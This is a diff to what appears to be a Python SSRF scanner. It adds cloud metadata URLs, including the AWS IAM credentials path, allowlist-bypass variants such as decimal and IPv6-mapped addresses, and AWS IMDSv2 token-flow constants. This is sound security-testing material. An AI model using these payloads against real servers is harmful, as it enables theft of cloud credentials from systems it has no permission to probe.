@@ -318,8 +318,9 @@ SSRF_PAYLOADS = [
     "http://169.254.169.254/latest/meta-data/",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "http://metadata.google.internal/computeMetadata/v1/",
-    "http://100.100.100.200/latest/meta-data/",
-    "http://169.254.169.254/metadata/v1/",
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+    "http://100.100.100.200/latest/meta-data/",  # Alibaba
+    "http://169.254.169.254/metadata/v1/",  # DigitalOcean
     "http://127.0.0.1/",
     "http://127.0.0.1:80/",
     "http://127.0.0.1:443/",
@@ -327,7 +328,18 @@ SSRF_PAYLOADS = [
     "http://[::1]/",
     "http://0.0.0.0/",
     "http://localhost/",
+    # Bypass variants (parser/allowlist evasion)
+    "http://169.254.169.254.nip.io/latest/meta-data/",
+    "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/",
+    "http://2852039166/latest/meta-data/",  # decimal IP for 169.254.169.254
 ]
+
+# AWS IMDSv2 requires a session token obtained via PUT to /latest/api/token.
+# A server that proxies our URL *and* forwards our headers can be walked
+# through the two-step flow. See REAL_WORLD_RESEARCH.md §4 (Capital One).
+IMDSV2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
+IMDSV2_CRED_URL = ("http://169.254.169.254/latest/meta-data/iam/"
+                   "security-credentials/")
 
 SSRF_INDICATORS = re.compile(
     r"(ami-id|instance-id|instance-type|local-ipv4|security-credentials|"
